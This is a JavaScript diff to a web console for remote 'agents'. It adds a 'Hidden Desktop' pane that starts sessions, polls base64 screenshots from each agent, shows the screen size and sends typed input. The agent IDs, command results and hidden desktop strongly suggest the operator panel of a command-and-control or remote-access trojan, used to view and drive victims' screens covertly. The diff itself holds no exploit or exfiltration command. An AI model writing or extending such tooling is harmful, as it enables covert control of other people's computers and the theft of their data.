@@ -399,7 +399,7 @@
     }
 
     // --- Console tabs ---
-    function openConsole(agentId) {
+    function openConsole(agentId, focusDesktop) {
         if (!consoleTabs[agentId]) {
             var tab = document.createElement('button');
             tab.className = 'tab';
@@ -427,6 +427,7 @@
                 '<div class="hd-pane" id="hd-' + escapeHtml(agentId) + '">' +
                     '<div class="hd-bar">' +
                         '<span>Hidden Desktop</span>' +
+                        '<span class="hd-status" id="hd-status-' + escapeHtml(agentId) + '">idle</span>' +
                         '<button type="button" class="glass-btn" data-hd="start">Start</button>' +
                         '<button type="button" class="glass-btn" data-hd="frame">Frame</button>' +
                         '<button type="button" class="glass-btn" data-hd="stop">Stop</button>' +
@@ -474,10 +475,16 @@
                 desktopActionFor(agentId, 'type ' + typer.value);
                 typer.value = '';
             });
-            consoleTabs[agentId] = { tab: tab, pane: pane };
+            consoleTabs[agentId] = { tab: tab, pane: pane, focusDesktop: false };
         }
+        if (focusDesktop && consoleTabs[agentId]) consoleTabs[agentId].focusDesktop = true;
         switchTab('console-' + agentId);
-        document.getElementById('console-input-' + agentId).focus();
+        if (consoleTabs[agentId] && consoleTabs[agentId].focusDesktop) {
+            var desk = document.getElementById('hd-img-' + agentId);
+            if (desk) desk.focus();
+        } else {
+            document.getElementById('console-input-' + agentId).focus();
+        }
     }
 
     function closeConsole(agentId) {
@@ -666,14 +673,16 @@
     var desktopTimers = {};
 
     function openDesktop(agentId) {
-        openConsole(agentId);
-        if (!desktopTimers[agentId]) {
-            desktopActionFor(agentId, 'start');
-            desktopActionFor(agentId, 'frame');
-            desktopTimers[agentId] = setInterval(function() { pollDesktop(agentId); }, 2000);
-        }
+        openConsole(agentId, true);
         var img = document.getElementById('hd-img-' + agentId);
         if (img) img.focus();
+        if (!desktopTimers[agentId]) {
+            desktopActionFor(agentId, 'start');
+            desktopTimers[agentId] = setInterval(function() {
+                api('POST', '/agents/' + agentId + '/desktop', { command: 'frame' }).catch(function() {});
+                pollDesktop(agentId);
+            }, 2500);
+        }
     }
 
     async function desktopActionFor(agentId, action) {
@@ -682,25 +691,49 @@
         setTimeout(function() { pollDesktop(agentId); }, 1500);
     }
 
+    function showDesktopFrame(agentId, out) {
+        if (!out || out.indexOf('HDIMG:') !== 0) return;
+        var payload = out.slice(6);
+        var comma = payload.indexOf(',');
+        var colon = payload.indexOf(':');
+        desktopScreen[agentId] = desktopScreen[agentId] || {w: 1024, h: 768};
+        if (comma > 0 && colon > comma) {
+            desktopScreen[agentId].w = parseInt(payload.slice(0, comma), 10) || desktopScreen[agentId].w;
+            desktopScreen[agentId].h = parseInt(payload.slice(comma + 1, colon), 10) || desktopScreen[agentId].h;
+            payload = payload.slice(colon + 1);
+        }
+        var img = document.getElementById('hd-img-' + agentId);
+        if (img) img.src = 'data:image/bmp;base64,' + payload;
+        var status = document.getElementById('hd-status-' + agentId);
+        if (status) status.textContent = desktopScreen[agentId].w + 'x' + desktopScreen[agentId].h;
+    }
+
     async function pollDesktop(agentId) {
+        try {
+            var view = await api('GET', '/agents/' + agentId + '/desktop/view');
+            if (view) {
+                if (view.status) {
+                    var status = document.getElementById('hd-status-' + agentId);
+                    if (status && view.status.indexOf('HDIMG:') !== 0) status.textContent = view.status;
+                }
+                if (view.frame) showDesktopFrame(agentId, view.frame);
+                if (view.frame || view.status) return;
+            }
+        } catch (e) {}
         try {
             var rows = await api('GET', '/agents/' + agentId + '/results');
             if (!rows) return;
             for (var i = rows.length - 1; i >= 0; i--) {
                 var out = rows[i].output || '';
-                if (out.indexOf('HDIMG:') !== 0) continue;
-                var payload = out.slice(6);
-                var comma = payload.indexOf(',');
-                var colon = payload.indexOf(':');
-                desktopScreen[agentId] = desktopScreen[agentId] || {w: 1024, h: 768};
-                if (comma > 0 && colon > comma) {
-                    desktopScreen[agentId].w = parseInt(payload.slice(0, comma), 10) || desktopScreen[agentId].w;
-                    desktopScreen[agentId].h = parseInt(payload.slice(comma + 1, colon), 10) || desktopScreen[agentId].h;
-                    payload = payload.slice(colon + 1);
+                var cmd = rows[i].command || '';
+                if (cmd.indexOf('__hd:') === 0 && out && out.indexOf('HDIMG:') !== 0) {
+                    var status2 = document.getElementById('hd-status-' + agentId);
+                    if (status2) status2.textContent = out;
                 }
-                var img = document.getElementById('hd-img-' + agentId);
-                if (img) img.src = 'data:image/bmp;base64,' + payload;
-                return;
+                if (out.indexOf('HDIMG:') === 0) {
+                    showDesktopFrame(agentId, out);
+                    return;
+                }
             }
         } catch (e) {}
     }
